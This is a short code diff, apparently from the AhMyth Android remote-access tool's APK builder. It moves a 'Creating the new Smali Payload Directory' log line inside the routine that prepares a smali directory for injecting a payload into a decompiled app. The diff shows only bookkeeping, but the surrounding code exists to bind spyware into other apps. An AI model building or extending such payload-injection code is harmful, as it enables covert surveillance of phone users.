@@ -252,9 +252,7 @@ $appCtrl.CopyAhmythFilesAndGenerateApk = (apkFolder) => {
             delayedLog('[x] Reading the Decompiled APK Failed!', CONSTANTS.logStatus.FAIL)
             return;
         }
-
-        delayedLog('[★] Creating the new Smali Payload Directory...')
-
+        
         var ignoreDirs = ['original',
             'res',
             'build',
@@ -273,6 +271,7 @@ $appCtrl.CopyAhmythFilesAndGenerateApk = (apkFolder) => {
         smaliList.sort((a, b) => collator.compare(a, b));
         var lastSmali = smaliList[smaliList.length -1];
         if (lastSmali == "smali") {
+        delayedLog('[★] Creating the new Smali Payload Directory...')
 
             fs.mkdir(apkFolder + "/smali_classes2", {
                 recursive: true
